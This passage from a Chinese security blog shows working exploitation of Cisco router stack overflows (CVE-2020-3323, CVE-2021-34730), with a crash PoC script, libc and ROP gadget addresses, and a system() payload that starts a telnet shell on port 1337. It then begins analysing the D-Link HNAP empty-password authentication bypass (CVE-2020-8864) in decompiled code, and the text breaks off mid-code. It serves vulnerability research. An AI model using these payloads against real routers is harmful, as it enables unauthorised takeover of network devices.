<p>先上传一个 gdbserver 方便后续调试，设备默认带了 wget 命令，我们可以在本机开启一个 Server 放入 gdbserver，然后用 wget 下载到路由器。</p>
<p>gdbserver 下载链接：链接：<a class="link"   href="https://pan.baidu.com/s/1e6-lxtzI0aXNe0aGfiWRCg" >https://pan.baidu.com/s/1e6-lxtzI0aXNe0aGfiWRCg<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>     提取码：yyln </p>
<p>wget 命令</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://192.168.1.101:8000/gdbserver.mipsle</span><br></pre></td></tr></table></figure></div>

<h3 id="CVE-2020-3323-1"><a href="#CVE-2020-3323-1" class="headerlink" title="CVE-2020-3323"></a>CVE-2020-3323</h3><p>经过上面的环境配置，我们现在可以对 httpd 服务进行调试，先在路由器上面找到 httpd 进程 pid</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps | grep http</span><br></pre></td></tr></table></figure></div>

<p>这里会返回两个结果</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ps | grep http</span><br><span class="line">  348 admin      6284 S   httpd </span><br><span class="line">  356 admin      6344 S   httpd -S </span><br></pre></td></tr></table></figure></div>

<p>其中 httpd -S 是我们的调试目标。启动 gdbserver 进行附加</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./gdbserver.mipsle 192.168.1.1:12345 --attach 356</span><br></pre></td></tr></table></figure></div>

<p>成功附加之后在本机启动 gdb-multiarch，执行下面的命令</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">set sysroot ./</span><br><span class="line">file ./usr/sbin/httpd</span><br><span class="line">target remote 192.168.1.1:12345</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2020-3323-3.png"
                     
                ></p>
<p>成功启动调试环境，可以先编写一个 POC 脚本，方便后续操作，之前分析了漏洞成因，可编写出下面的 POC 脚本</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-ip&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;target ip&#x27;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.ip:</span><br><span class="line">    payload = <span class="string">&quot;status_guestnet.asp&quot;</span> +<span class="string">&quot;a&quot;</span> * <span class="number">0x100</span></span><br><span class="line">    burp0_url = <span class="string">&quot;https://&quot;</span> + args.ip + <span class="string">&quot;:443/guest_logout.cgi&quot;</span></span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, </span><br><span class="line">                     <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">    burp0_data = &#123;<span class="string">&quot;cmac&quot;</span>: <span class="string">&quot;00:01:02:03:04:05&quot;</span>, </span><br><span class="line">                  <span class="string">&quot;cip&quot;</span>: <span class="string">&quot;192.168.1.1&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;submit_button&quot;</span>: payload&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Exploit Success!&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>使用方法：python poc.py -ip 192.168.1.1</p>
<p>发送 payload 之后 gdb 中看到崩溃结果</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2020-3323-4.png"
                     
                ></p>
<p>成功控制 PC，接下来就尝试利用漏洞。</p>
<p>关于 MIPS 架构的漏洞利用文章网络上有很多，这里就不详细介绍了，由于整个系统没有开启 aslr，libc 地址固定，所以我们的思路就是构造 ROP 直接执行 system 函数，参数中插入开启 telnetd 的命令。</p>
<p>首先用 vmmap 命令获取设备的 libc 地址：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">  0x400000   0x491000 r-xp    91000 0      /usr/sbin/httpd</span><br><span class="line">  0x4d0000   0x4d8000 rw-p     8000 90000  /usr/sbin/httpd</span><br><span class="line">  0x4d8000   0x50e000 rwxp    36000 4d8000 [heap]</span><br><span class="line">0x2aaa8000 0x2aaad000 r-xp     5000 0      /lib/ld-uClibc.so.0</span><br><span class="line">0x2aaad000 0x2aaae000 rw-p     1000 2aaad000 </span><br><span class="line">0x2aaae000 0x2aabe000 r--p    10000 0      /dev/nvram</span><br><span class="line">0x2aaec000 0x2aaed000 r--p     1000 4000   /lib/ld-uClibc.so.0</span><br><span class="line">0x2aaed000 0x2aaee000 rw-p     1000 5000   /lib/ld-uClibc.so.0</span><br><span class="line">0x2aaee000 0x2aaf2000 r-xp     4000 0      /usr/lib/libnvram.so</span><br><span class="line">0x2aaf2000 0x2ab32000 ---p    40000 2aaf2000 </span><br><span class="line">0x2ab32000 0x2ab33000 rw-p     1000 4000   /usr/lib/libnvram.so</span><br><span class="line">0x2ab33000 0x2ab75000 r-xp    42000 0      /usr/lib/libshared.so</span><br><span class="line">0x2ab75000 0x2abb5000 ---p    40000 2ab75000 </span><br><span class="line">0x2abb5000 0x2abb9000 rw-p     4000 42000  /usr/lib/libshared.so</span><br><span class="line">0x2abb9000 0x2abbd000 rw-p     4000 2abb9000 </span><br><span class="line">0x2abbd000 0x2abcc000 r-xp     f000 0      /usr/lib/libcbt.so</span><br><span class="line">0x2abcc000 0x2ac0b000 ---p    3f000 2abcc000 </span><br><span class="line">0x2ac0b000 0x2ac0c000 rw-p     1000 e000   /usr/lib/libcbt.so</span><br><span class="line">0x2ac0c000 0x2ac0e000 r-xp     2000 0      /lib/libdl.so.0</span><br><span class="line">0x2ac0e000 0x2ac4d000 ---p    3f000 2ac0e000 </span><br><span class="line">0x2ac4d000 0x2ac4e000 r--p     1000 1000   /lib/libdl.so.0</span><br><span class="line">0x2ac4e000 0x2ac4f000 rw-p     1000 2000   /lib/libdl.so.0</span><br><span class="line">0x2ac4f000 0x2ae3c000 r-xp   1ed000 0      /usr/lib/libcrypto.so</span><br><span class="line">0x2ae3c000 0x2ae7c000 ---p    40000 2ae3c000 </span><br><span class="line">0x2ae7c000 0x2ae94000 rw-p    18000 1ed000 /usr/lib/libcrypto.so</span><br><span class="line">0x2ae94000 0x2ae98000 rw-p     4000 2ae94000 </span><br><span class="line">0x2ae98000 0x2af02000 r-xp    6a000 0      /usr/lib/libssl.so</span><br><span class="line">0x2af02000 0x2af42000 ---p    40000 2af02000 </span><br><span class="line">0x2af42000 0x2af48000 rw-p     6000 6a000  /usr/lib/libssl.so</span><br><span class="line">0x2af48000 0x2af58000 r-xp    10000 0      /lib/libgcc_s.so.1</span><br><span class="line">0x2af58000 0x2af97000 ---p    3f000 2af58000 </span><br><span class="line">0x2af97000 0x2af98000 rw-p     1000 f000   /lib/libgcc_s.so.1</span><br><span class="line">0x2af98000 0x2afef000 r-xp    57000 0      /lib/libc.so.0</span><br><span class="line">0x2afef000 0x2b02f000 ---p    40000 2afef000 </span><br><span class="line">0x2b02f000 0x2b030000 r--p     1000 57000  /lib/libc.so.0</span><br><span class="line">0x2b030000 0x2b031000 rw-p     1000 58000  /lib/libc.so.0</span><br><span class="line">0x2b031000 0x2b036000 rw-p     5000 2b031000 </span><br><span class="line">0x7f94b000 0x7f960000 rwxp    15000 7f94b000 [stack]</span><br></pre></td></tr></table></figure></div>

<p>可以看到 libc 加载到 0x2af98000 这个地址，并且每次重启都不会改变。</p>
<p>ROP 思路是调用 system(“utelnetd -d -l &#x2F;bin&#x2F;sh -p 1337 &amp;”)，有了 libc 地址接下来需要寻找 system 函数的地址，目标 libc 文件位于 &#x2F;lib&#x2F;libc.so.0，将它加载到 IDA 可以找到 system 函数的偏移量为 0x0004C7E0。</p>
<p>找到 system 函数地址，还需要解决参数的问题，MIPS 中函数的前几个参数由 a0、a1 等寄存器进行传递，而由于可控的内存只在栈上，所以肯定要想办法把栈地址加载到这些寄存器中。</p>
<p>由于 MIPS 架构的特性，确实存在这类指令可以用于 ROP，在 mips rop finder 中使用 mipsrop.stackfinder() 就可以找到。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Python&gt;mipsrop.stackfinder()</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  0x0000BA84  |  addiu $a1,$sp,0x168+var_B0                          |  jalr  $s0                             |</span><br><span class="line">|  0x00011918  |  addiu $a2,$sp,0x88+var_60                           |  jalr  $s1                             |</span><br><span class="line">|  0x000250A8  |  addiu $s0,$sp,0x2A0+var_278                         |  jalr  $fp                             |</span><br><span class="line">|  0x000257A0  |  addiu $a0,$sp,0x58+var_40                           |  jalr  $s0                             |</span><br><span class="line">|  0x00025CAC  |  addiu $a0,$sp,0x60+var_48                           |  jalr  $s3                             |</span><br><span class="line">|  0x0002747C  |  addiu $a0,$sp,0x60+var_48                           |  jalr  $s3                             |</span><br><span class="line">|  0x0002CC00  |  addiu $a0,$sp,0x48+var_20                           |  jalr  $s0                             |</span><br><span class="line">|  0x0002CC08  |  addiu $a0,$sp,0x48+var_20                           |  jalr  $s1                             |</span><br><span class="line">|  0x00035DF4  |  addiu $a1,$sp,0x40+var_28                           |  jalr  $s1                             |</span><br><span class="line">|  0x0003D050  |  addiu $a0,$sp,0x38+var_20                           |  jalr  $a0                             |</span><br><span class="line">|  0x000427A8  |  addiu $s0,$sp,0xE0+var_C0                           |  jalr  $s6                             |</span><br><span class="line">|  0x00042E04  |  addiu $v1,$sp,0x118+var_F8                          |  jalr  $s1                             |</span><br><span class="line">|  0x0000D45C  |  addiu $a0,$sp,0xA0+var_88                           |  jr    0xA0+var_4($sp)                 |</span><br><span class="line">|  0x0000ED70  |  addiu $a1,$sp,0x28+var_10                           |  jr    0x28+var_8($sp)                 |</span><br><span class="line">|  0x0001D5FC  |  addiu $a3,$sp,0x30+var_10                           |  jr    0x30+var_8($sp)                 |</span><br><span class="line">|  0x00020100  |  addiu $a0,$sp,0x30+var_18                           |  jr    0x30+var_8($sp)                 |</span><br><span class="line">|  0x0002C060  |  addiu $a0,$sp,0x80+var_68                           |  jr    0x80+var_4($sp)                 |</span><br><span class="line">|  0x0002F800  |  addiu $a1,$sp,0x58+var_40                           |  jr    0x58+var_8($sp)                 |</span><br><span class="line">|  0x00030434  |  addiu $a0,$sp,0x48+var_30                           |  jr    0x48+var_8($sp)                 |</span><br><span class="line">|  0x00039948  |  addiu $a1,$sp,0x50+var_38                           |  jr    0x50+var_8($sp)                 |</span><br><span class="line">|  0x000399A0  |  addiu $a1,$sp,0x50+var_38                           |  jr    0x50+var_8($sp)                 |</span><br><span class="line">|  0x000399F8  |  addiu $a1,$sp,0x50+var_38                           |  jr    0x50+var_8($sp)                 |</span><br><span class="line">|  0x00039A50  |  addiu $a1,$sp,0x50+var_38                           |  jr    0x50+var_8($sp)                 |</span><br><span class="line">|  0x00039A90  |  addiu $a1,$sp,0x50+var_38                           |  jr    0x50+var_8($sp)                 |</span><br><span class="line">|  0x00039AFC  |  addiu $a1,$sp,0x50+var_38                           |  jr    0x50+var_8($sp)                 |</span><br><span class="line">|  0x00039B5C  |  addiu $a1,$sp,0x50+var_38                           |  jr    0x50+var_8($sp)                 |</span><br><span class="line">|  0x0003A844  |  addiu $a0,$sp,0x50+var_38                           |  jr    0x50+var_4($sp)                 |</span><br><span class="line">|  0x0003D05C  |  addiu $a0,$sp,0x38+var_20                           |  jr    0x38+var_8($sp)                 |</span><br><span class="line">|  0x0004BAA8  |  addiu $a1,$sp,0x3048+var_1030                       |  jr    0x3048+var_4($sp)               |</span><br><span class="line">|  0x0004D314  |  addiu $a2,$sp,0x28+var_10                           |  jr    0x28+var_8($sp)                 |</span><br><span class="line">|  0x0004D484  |  addiu $a2,$sp,0x28+var_10                           |  jr    0x28+var_8($sp)                 |</span><br><span class="line">|  0x0004D8E4  |  addiu $a2,$sp,0x28+var_10                           |  jr    0x28+var_8($sp)                 |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">Found 32 matching gadgets</span><br></pre></td></tr></table></figure></div>

<p>具体应该用哪条就要通过调试来确定了，我们希望执行 system 函数，所以要将栈地址加载到 a0 寄存器中，通过调试发现 0x000257A0 这条指令比较合适。另外还需要注意一点，这类 gadget 的转移条件并不是像 x86 一样通过栈中的返回地址返回，而是 jr &lt;某个内存地址 or 寄存器&gt;，我们选择的这条 gadget 转移条件是 jr $s0，也就是说，需要提前控制 s0 寄存器为下一个 gadget 的地址，才能保证 ROP 链顺利执行。</p>
<p>一般情况下 MIPS 函数返回的时候都会把栈中的部分数据转移到 s0 ~ s8 寄存器中，所以只要提前在栈中布置好 s0 对应的地址即可。</p>
<p>到这里必要的地址都找到了，payload 的构成应该是</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">padding + next_gadget_address + padding2 + gadget_address + padding3 + command</span><br></pre></td></tr></table></figure></div>

<p>gadget_address 占据返回地址的位置，程序跑到这里先运行第一段 gadget，将栈地址加载到 a0，这个地址就指向 command，然后 jr $s0，返回到 next_gadget_address，也就是执行 system 函数，从而实现 system(command)。</p>
<p><a href="https://asciinema.org/a/EViNYMB5pl6esKop0lktUIZ22"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://asciinema.org/a/EViNYMB5pl6esKop0lktUIZ22.svg"
                      alt="asciicast"
                ></a></p>
<h3 id="CVE-2021-34730-1"><a href="#CVE-2021-34730-1" class="headerlink" title="CVE-2021-34730"></a>CVE-2021-34730</h3><p>upnp 这个也是栈溢出漏洞，利用思路和上一个非常类似，执行 system(command) 即可，不过 upnp 服务开放在 udp 端口，在编写脚本的时候可能需要注意一下。</p>
<p><a href="https://asciinema.org/a/Orv3mcq3JBkhVUcTh6ttyXEHv"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://asciinema.org/a/Orv3mcq3JBkhVUcTh6ttyXEHv.svg"
                      alt="asciicast"
                ></a></p>
<h3 id="后台栈溢出"><a href="#后台栈溢出" class="headerlink" title="后台栈溢出"></a>后台栈溢出</h3><p>漏洞利用思路和前面的相同，但是后台价值不高，就不演示了。</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>IoT 设备中身份验证绕过的一些漏洞(1)</title>
    <url>/2020/08/28/bypass_auth/</url>
    <content><![CDATA[<p><strong>Update: 2021-01-18：  修正 CVE-2020-8861 分析过程</strong></p>
<p>在 IoT 漏洞中，身份验证漏洞出现频率较高，并且能够造成的危害很大，通过身份验证的绕过，攻击者可以访问到很多敏感 API，甚至可以结合其他漏洞直接获取设备 shell，给用户带来重大损失。</p>
<span id="more"></span>

<h1 id="CVE-2020-8864"><a href="#CVE-2020-8864" class="headerlink" title="CVE-2020-8864"></a>CVE-2020-8864</h1><p>2020 年 2 月 24 日，ZDI 团队披露了存在于 D-Link 多个型号路由器中的身份验证绕过漏洞，通过利用漏洞，攻击者可从 LAN 侧轻易的控制路由器，实现修改 admin 用户密码、篡改路由器默认配置、甚至结合其他漏洞实现蠕虫植入等操作。</p>
<h2 id="漏洞基本信息"><a href="#漏洞基本信息" class="headerlink" title="漏洞基本信息"></a>漏洞基本信息</h2><p>以下是从披露页面摘抄的漏洞信息</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">This vulnerability allows network-adjacent attackers to bypass authentication on affected installations of D-Link DIR-867, DIR-878, and DIR-882 routers. Authentication is not required to exploit this vulnerability.</span><br><span class="line"></span><br><span class="line">The specific flaw exists within the handling of HNAP login requests. The issue results from the lack of proper handling of empty passwords. An attacker can leverage this vulnerability to execute arbitrary code on the router.</span><br></pre></td></tr></table></figure></div>

<p>此漏洞影响 DIR-867, DIR-878, DIR-882 路由器，漏洞产生原因大概是在处理 HNAP 请求过程中，由于缺少了对空密码的验证流程，导致攻击者可以使用空密码绕过身份验证，从而访问敏感 API 接口。</p>
<p>漏洞类型：身份验证绕过</p>
<p>漏洞威胁：较高 (8.8)</p>
<p>漏洞影响：攻击者绕过身份验证，从而访问敏感 API，执行敏感操作。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>可以去 <a class="link"   href="ftp://ftp2.dlink.com/PRODUCTS/DIR-882/REVA/" >ftp://ftp2.dlink.com/PRODUCTS/DIR-882/REVA/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 下载固件，这里我使用的是 1.10B02 25MB 版本，其中包含了未加密的固件，可以直接拿过来进行解包。</p>
<p>解包之后简单看一下整个文件系统，web 服务器使用的是 lighttpd，通过查看其配置文件，发现大部分请求都会被转发到 prog.cgi 进行处理。</p>
<p>拿到 prog.cgi 放进 Ghidra 进行分析，根据漏洞信息，我们需要寻找处理 HNAP 登录请求的代码，先搜索字符串 Login 看一下有没有什么线索。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/aubypass-1.png"
                     
                ></p>
<p>找到了几个包含 login 的字符串，其中第一项 &#x2F;HNAP1&#x2F;login 感觉和请求有关，通过查找交叉引用，找到了函数</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">undefined4 <span class="title function_">FUN_0041ed9c</span><span class="params">(<span class="type">int</span> param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  undefined4 uVar2;</span><br><span class="line">  </span><br><span class="line">  iVar1 = <span class="built_in">strncmp</span>(*(<span class="type">char</span> **)(param_1 + <span class="number">0xc4</span>),<span class="string">&quot;/HNAP1/Login&quot;</span>,<span class="number">0xc</span>);</span><br><span class="line">  <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) || (iVar1 = <span class="built_in">strncmp</span>(*(<span class="type">char</span> **)(param_1 + <span class="number">0xc4</span>),<span class="string">&quot;/HNAP1/Logout&quot;</span>,<span class="number">0xd</span>), iVar1 ==<span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    uVar2 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    uVar2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> uVar2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>交叉引用此函数找到了判断 login 请求的函数</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">undefined4 <span class="title function_">FUN_004249ec</span><span class="params">(<span class="type">int</span> param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">char</span> *__s1;</span><br><span class="line">  undefined4 uVar2;</span><br><span class="line">  </span><br><span class="line">  FUN_00424610(param_1);</span><br><span class="line">  iVar1 = FUN_0041ed9c(param_1);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">    __s1 = (<span class="type">char</span> *)webGetVarString(param_1,<span class="string">&quot;/Login/Action&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((__s1 == (<span class="type">char</span> *)<span class="number">0x0</span>) || (iVar1 = <span class="built_in">strncmp</span>(__s1,<span class="string">&quot;request&quot;</span>,<span class="number">7</span>), iVar1 != <span class="number">0</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> ((__s1 == (<span class="type">char</span> *)<span class="number">0x0</span>) || (iVar1 = <span class="built_in">strncmp</span>(__s1,<span class="string">&quot;login&quot;</span>,<span class="number">5</span>), iVar1 != <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((__s1 == (<span class="type">char</span> *)<span class="number">0x0</span>) || (iVar1 = <span class="built_in">strncmp</span>(__s1,<span class="string">&quot;logout&quot;</span>,<span class="number">6</span>), iVar1 != <span class="number">0</span>)) &#123;</span><br><span class="line">          FUN_00424c88(param_1,<span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">          FUN_00422420(param_1);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        hnap_login(param_1);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      FUN_004206c0(param_1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  iVar1 = FUN_00423bd4(param_1);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">    iVar1 = FUN_00423d70(param_1);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">      uVar2 = FUN_00422764(param_1);</span><br><span class="line">      <span class="keyword">return</span> uVar2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  iVar1 = FUN_00424890(param_1);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">1</span>) &#123;</span><br><span class="line">    websDefaultHandler(param_1,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="string">&quot;/Index.html&quot;</span>,<span class="string">&quot;/Index.html&quot;</span>,*(undefined4 *)(param_1 +<span class="number">0xf8</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  uVar2 = FUN_00423ecc(param_1);</span><br><span class="line">  <span class="keyword">return</span> uVar2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>通过取得 &#x2F;Login&#x2F;Action 字段来判断这个请求是登录还是登出。于是可以定位到登录请求函数 hnap_login。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">undefined4 <span class="title function_">hnap_login</span><span class="params">(undefined4 param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *__s;</span><br><span class="line">  uchar *data;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">char</span> *username;</span><br><span class="line">  <span class="type">char</span> *password;</span><br><span class="line">  <span class="type">size_t</span> len;</span><br><span class="line">  EVP_MD *md;</span><br><span class="line">  undefined4 uVar2;</span><br><span class="line">  <span class="type">char</span> *local_378;</span><br><span class="line">  uint local_374;</span><br><span class="line">  <span class="type">char</span> realPassword [<span class="number">512</span>];</span><br><span class="line">  byte abStack352 [<span class="number">128</span>];</span><br><span class="line">  uint local_e0;</span><br><span class="line">  HMAC_CTX HStack220;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">memset</span>(realPassword,<span class="number">0</span>,<span class="number">0x200</span>);</span><br><span class="line">  <span class="built_in">memset</span>(abStack352,<span class="number">0</span>,<span class="number">0x80</span>);</span><br><span class="line">  local_378 = realPassword;</span><br><span class="line">  local_e0 = <span class="number">0x80</span>;</span><br><span class="line">  __s = (<span class="type">char</span> *)websGetRequestPrivateKey(param_1);</span><br><span class="line">  data = (uchar *)FUN_0042176c(param_1);</span><br><span class="line">  iVar1 = FUN_00421a44(param_1);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">    FUN_00424c88(param_1,<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  username = (<span class="type">char</span> *)webGetVarString(param_1,<span class="string">&quot;/Login/Username&quot;</span>);</span><br><span class="line">  password = (<span class="type">char</span> *)webGetVarString(param_1,<span class="string">&quot;/Login/LoginPassword&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ((((__s == (<span class="type">char</span> *)<span class="number">0x0</span>) || (data == (uchar *)<span class="number">0x0</span>)) || (username == (<span class="type">char</span> *)<span class="number">0x0</span>)) ||</span><br><span class="line">     ((password == (<span class="type">char</span> *)<span class="number">0x0</span> ||</span><br><span class="line">      ((iVar1 = <span class="built_in">strncmp</span>(username,<span class="string">&quot;Admin&quot;</span>,<span class="number">5</span>), iVar1 != <span class="number">0</span> &amp;&amp;</span><br><span class="line">       (iVar1 = <span class="built_in">strncmp</span>(username,<span class="string">&quot;admin&quot;</span>,<span class="number">5</span>), iVar1 != <span class="number">0</span>)))))) &#123;</span><br><span class="line">LAB_004223b8:</span><br><span class="line">    FUN_00424c88(param_1,<span class="number">4</span>);</span><br><span class="line">    uVar2 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    HMAC_CTX_init(&amp;HStack220);</span><br><span class="line">    len = <span class="built_in">strlen</span>(__s);</span><br><span class="line">    md = EVP_md5();</span><br><span class="line">    HMAC_Init_ex(&amp;HStack220,__s,len,md,(ENGINE *)<span class="number">0x0</span>);</span><br><span class="line">    len = <span class="built_in">strlen</span>((<span class="type">char</span> *)data);</span><br><span class="line">    HMAC_Update(&amp;HStack220,data,len);</span><br><span class="line">    HMAC_Final(&amp;HStack220,abStack352,&amp;local_e0);</span><br><span class="line">    HMAC_CTX_cleanup(&amp;HStack220);</span><br><span class="line">    local_374 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (local_374 != local_e0) &#123;</span><br><span class="line">      <span class="built_in">sprintf</span>(local_378,<span class="string">&quot;%02x&quot;</span>,(uint)abStack352[local_374]);</span><br><span class="line">      local_374 = local_374 + <span class="number">1</span>;</span><br><span class="line">      local_378 = local_378 + <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    FUN_0041df08(realPassword,<span class="number">0x200</span>);</span><br><span class="line">    __s = (<span class="type">char</span> *)nvram_safe_get(<span class="string">&quot;IsDefaultLogin&quot;</span>);</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>(__s,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">      len = <span class="built_in">strlen</span>(password);</span><br><span class="line">      iVar1 = <span class="built_in">strncmp</span>(realPassword,password,len);</span><br><span class="line">      <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">        FUN_00421dcc(param_1);</span><br><span class="line">        <span class="keyword">goto</span> LAB_004223b8;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    FUN_0042194c(param_1);</span><br><span class="line">    FUN_0041fee8(param_1);</span><br><span class="line">    FUN_00424c88(param_1,<span class="number">1</span>);</span><br><span class="line">    uVar2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> uVar2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个函数的代码比较多，我用 C 写了一个简化版</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span>* username = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="type">char</span>* password = <span class="string">&quot;admin888&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* realUsername = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="type">char</span>* realPassword = <span class="string">&quot;admin888&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strncmp</span>(realUsername, username, <span class="number">5</span>))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Username incorrect!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(password);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(realPassword, password, len))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span 